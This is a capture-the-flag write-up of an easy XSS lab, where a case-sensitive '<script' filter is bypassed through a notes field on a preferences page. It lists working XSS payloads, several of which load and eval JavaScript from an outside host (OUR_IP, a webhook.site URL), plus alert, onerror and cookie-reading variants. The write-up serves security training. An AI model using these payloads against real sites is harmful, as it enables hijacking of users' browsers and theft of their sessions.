---
title: "Webverselabs Palisade Challenge XSS "
date: 2026-05-21 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Easy , Challenge , Web_Attacks ]
---



## Scenario : 

Palisade rents mountaineering kits. The dev wrote a case-sensitive string replace to strip "<script". He shipped it at 11pm the night before a demo. Nothing blew up. Yet.


## Solution : 


<img width="1816" height="722" alt="image" src="https://github.com/user-attachments/assets/ad4112ed-8a8d-4908-b383-382b07af9bd0" />

As usual , we first start by enumerating the application like a normal user , since this is and XSS challenge , we're looking for fields where we can inject , or a parameter in the GET request , anything where we can inject our payloads . 

<img width="1123" height="933" alt="image" src="https://github.com/user-attachments/assets/348cabf8-9bd1-4abf-bb9d-faa638109a07" />

After searching the application , we find the /preferences endpoint , where we can submit a custom note . Now my first reflex would be to try and use a payload that will call our server since this is a note that will be submitted so we don't really know if it will be reflected back to us . 

For this one i used Web Hook Site : 

<img width="1112" height="779" alt="image" src="https://github.com/user-attachments/assets/0002b988-9528-4dae-a85b-39f3a4ffdd7d" />

Now for the payload : 

```js
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>  
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://webhook.site/86212154-85cb-45f2-aeb0-e592200e5d74");a.send();</script>  
```
<img width="1370" height="676" alt="image" src="https://github.com/user-attachments/assets/b48904c7-472f-4937-b862-5454341cfdb6" />

Perfect we do get our callback which confirms the XSS , of course we can use other payloads that allow to fetch external resources : 

```js
<script src=http://OUR_IP></script> 
'><script src=http://OUR_IP></script> "> 
<script src=http://OUR_IP></script> javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)') 
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>  
<script>$.getScript("http://OUR_IP")</script> 
```
We can also try different payloads if the result is reflected back to us :

```js
==> This will show origin IP : 
<script>alert(window.origin)</script>

==> If alert is blocked : 
<script>print()</script> 

==> If Script is blocked : 
<img src="" onerror=alert(window.origin)>

==> Cookie Exfiltration : 
#"><img src=/ onerror=alert(document.cookie)>
```

But any of the payloads will trigger the XSS and we should get our flag : 

<img width="1352" height="723" alt="image" src="https://github.com/user-attachments/assets/4b163d8e-f063-416d-9b01-51d371ca475d" />

That was it for this challenge , see you in the next one :) 
